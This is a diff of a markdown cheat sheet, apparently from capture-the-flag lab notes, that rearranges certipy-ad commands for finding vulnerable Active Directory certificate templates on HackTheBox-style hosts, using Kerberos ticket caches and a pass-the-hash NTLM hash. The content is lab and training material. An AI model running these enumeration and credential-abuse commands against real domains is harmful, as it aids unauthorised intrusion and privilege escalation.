@@ -27,12 +27,22 @@ KRB5CCNAME=$PWD/<victim_username_with_TGT>.ccache certipy-ad find -scheme <schem
 ```
 
 ```shell
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.129.251.172 -vulnerable -stdout
+```
+
+
+Find vulnerabilities:
+
+```shell
 certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.193.226 -stdout
 ```
 
+Find templates:
+
 ```shell
-KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.129.251.172 -vulnerable -stdout
+certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.179.157 -stdout
 ```
+
 
 ### Req
 
